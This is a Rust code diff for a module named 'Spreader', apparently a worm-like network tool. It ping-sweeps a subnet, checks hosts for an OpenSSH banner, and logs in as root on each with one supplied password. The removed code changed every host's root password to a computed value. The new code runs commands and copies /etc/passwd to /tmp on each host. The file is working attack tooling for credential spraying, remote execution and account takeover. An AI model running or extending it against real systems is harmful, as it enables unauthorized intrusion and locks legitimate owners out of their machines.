@@ -1,104 +1,190 @@
 use crate::net::communicator::{Credentials, Session};
+use anyhow::anyhow;
+use tokio::time::{timeout, Duration};
 // use crate::net::enumeration::ping::Enumerator;
 use crate::net::enumeration::ping::Enumerator;
-use crate::net::session_pool::SessionPool;
+// use crate::net::session_pool::SessionPool;
 use crate::net::ssh::{SSHClient, SSHSession};
+use crate::net::types::{Host, OS};
 use crate::net::winexe::{WinexeClient, WinexeSession};
 use futures::future::join_all;
+use std::io::{self, Read, Write};
+use std::str;
 use std::sync::Arc;
-use tokio::sync::Mutex;
+use tokio::io::{AsyncReadExt, AsyncWriteExt};
+use tokio::net::TcpStream;
 
-#[derive(Debug)]
-pub enum OS {
-    Unix,
-    Windows,
-    Unknown,
+pub enum SessionType {
+    SSH(SSHSession),
+    Winexe(WinexeSession),
+}
+
+pub struct ConnectionPool {
+    pub(crate) clients: Vec<Arc<(OS, SessionType)>>,
+}
+
+impl ConnectionPool {
+    pub async fn new(subnet: &str, password: &str) -> Self {
+        let hosts = Enumerator::new(subnet).ping_sweep().await;
+
+        match hosts {
+            Ok(hosts) => {
+                let clients = Self::scan(&hosts, password).await;
+                Self { clients }
+            }
+            Err(e) => panic!("Error: {}", e),
+        }
+    }
+    async fn scan(hosts: &Vec<Arc<Host>>, password: &str) -> Vec<Arc<(OS, SessionType)>> {
+        let mut futures = Vec::new();
+        let pass: Arc<String> = Arc::new(password.to_string());
+
+        for host in hosts {
+            let shared_pass = pass.clone();
+            let host_arc_clone = host.clone();
+
+            let future = async move {
+                let task_timeout = Duration::from_secs(15);
+                match timeout(
+                    task_timeout,
+                    establish_connection(host_arc_clone, shared_pass),
+                )
+                .await
+                {
+                    Ok(Some(connection)) => Some(connection),
+                    Ok(None) | Err(_) => {
+                        println!("Connection to {} failed or timed out", host.ip);
+                        None
+                    }
+                }
+            };
+
+            futures.push(future);
+        }
+
+        let results = join_all(futures).await;
+
+        results.into_iter().filter_map(|result| result).collect()
+    }
+}
+
+async fn is_ssh_open(ip: &str) -> Result<bool, io::Error> {
+    let timeout_duration = Duration::from_secs(5); // Set your desired timeout duration
+    let target = format!("{}:22", ip);
+
+    // Apply the timeout to the connection attempt
+    let mut stream = timeout(timeout_duration, TcpStream::connect(target)).await??;
+
+    let mut buffer = [0; 1024];
+    // Apply the timeout to the read operation
+    let bytes_read = timeout(timeout_duration, stream.read(&mut buffer)).await??;
+
+    let banner = str::from_utf8(&buffer[..bytes_read]).unwrap_or_else(|_| "<Invalid UTF-8 data>");
+
+    Ok(banner.contains("OpenSSH"))
+}
+
+async fn establish_connection(
+    host: Arc<Host>,
+    password: Arc<String>,
+) -> Option<Arc<(OS, SessionType)>> {
+    match host.os {
+        OS::Unix => {
+            match is_ssh_open(&host.ip).await {
+                Ok(is_open) => {
+                    if !is_open {
+                        return None;
+                    }
+                }
+                Err(_) => return None,
+            }
+
+            let creds = Credentials {
+                username: "root".into(),
+                password: Some(password.to_string()),
+                key: None,
+            };
+
+            let mut client = SSHClient::new(); // Initialize the client here without 'let'
+            client.ip(host.ip.as_str());
+
+            let timeout_duration = Duration::from_secs(15);
+
+            let session = match timeout(timeout_duration, client.connect(&creds)).await {
+                Ok(Ok(session)) => {
+                    println!("WE GOT A SESSION on ip {}", host.ip);
+                    Arc::new((host.os, SessionType::SSH(session)))
+                }
+                Ok(Err(e)) => {
+                    println!("Error on {}: {}", host.ip, e);
+                    return None;
+                }
+                Err(_) => {
+                    println!("Connection to {} timed out", host.ip);
+                    return None;
+                }
+            };
+
+            Some(session)
+        }
+        _ => None,
+    }
 }
 
 pub struct Spreader {
-    linux_hosts: Mutex<Vec<(String, Arc<dyn Session>)>>,
-    windows_hosts: SessionPool,
-    password: String,
+    pub(crate) pool: ConnectionPool,
 }
 
 impl Spreader {
-    pub fn new(password: String) -> Self {
-        Spreader {
-            linux_hosts: Mutex::new(Vec::new()),
-            windows_hosts: SessionPool::new(),
-            password: password,
-        }
+    pub async fn new(subnet: &str, password: &str) -> Self {
+        let spreader = Self {
+            pool: ConnectionPool::new(subnet, password).await,
+        };
+        spreader
     }
 
-    pub async fn enumerate_hosts(&mut self, subnet: &str) {
-        // let hosts
-        println!("Enumerating hosts in subnet: {}", subnet);
-        let mut enumerator = Enumerator::new(subnet.to_string());
-        let _ = enumerator.ping_sweep().await;
+    pub async fn spread(&self) {
+        let clients = Arc::new(&self.pool.clients);
+        let mut futures = Vec::new();
 
-        for host in enumerator.hosts {
-            match host.os {
-                OS::Unix => {
-                    let session = match SSHClient::new()
-                        .ip(host.ip.clone())
-                        .connect(&Credentials {
-                            username: "root".into(),
-                            password: Some(self.password.clone()),
-                            key: None,
-                        })
-                        .await
-                    {
-                        Ok(session) => {
-                            println!("{}", host.ip);
-                            self.linux_hosts
-                                .lock()
-                                .await
-                                .push((host.ip, Arc::new(session)))
-                        }
-                        _ => (),
-                    };
-                }
-                OS::Unknown => (),
-                _ => (),
-            }
-        }
-    }
+        for client in clients.iter() {
+            let shared_client = client.clone();
 
-    async fn spread_unix(&mut self) {
-        let mut handles = vec![];
-        let hosts = self.linux_hosts.lock().await;
-
-        hosts.iter().for_each(|host| {
-            // let (ip, session) = Arc::clone(host);
-            let session: Arc<dyn Session> = Arc::clone(&host.1);
-            let ip = host.0.clone();
-
-            handles.push(tokio::spawn(async move {
-                let mut magic: u16 = 0;
-                if let Some(last_segment) = ip.split('.').last() {
-                    if let Ok(last_octet) = last_segment.parse::<u16>() {
-                        magic = last_octet * 69;
-                    } else {
-                        println!("Failed to parse the last segment as u8");
+            // Create a future for each client and add it to the vector
+            let client_future = async move {
+                match shared_client.0 {
+                    OS::Unix => {
+                        match Self::spread_unix(&shared_client.1).await {
+                            Ok(_) => println!("Successfully spread"),
+                            Err(e) => println!("Error spreading: {}", e),
+                        };
                     }
-                } else {
-                    println!("No segments found in IP address");
-                    return;
+                    _ => {}
                 }
+            };
 
-                // Echo change password and pipe it to passwd command to change password
-                let passwd = format!("GoblinoMunchers{}!", magic);
-                let command = format!("echo '{}' | passwd --stdin root", passwd);
+            futures.push(client_future);
+        }
 
-                let _ = session.execute_command(&command).await;
-            }));
-        });
-
-        join_all(handles).await;
-        // return handles;
+        // Await all futures concurrently
+        join_all(futures).await;
     }
 
-    pub async fn spread(&mut self) {
-        return self.spread_unix().await;
+    async fn spread_unix(session: &SessionType) -> anyhow::Result<()> {
+        let session = match session {
+            SessionType::SSH(session) => session,
+            // Throw an error if the session is not SSH
+            _ => return Err(anyhow!("Session is not SSH")),
+        };
+
+        println!("Running ls -la Hopefully im at least concurrent ");
+        std::io::stdout().flush().unwrap();
+        session.execute_command("ls -la").await?;
+
+        println!("Transfering file");
+        session.transfer_file("/etc/passwd", "/tmp/passwd").await?;
+
+        session.close().await?;
+        Ok(())
     }
 }
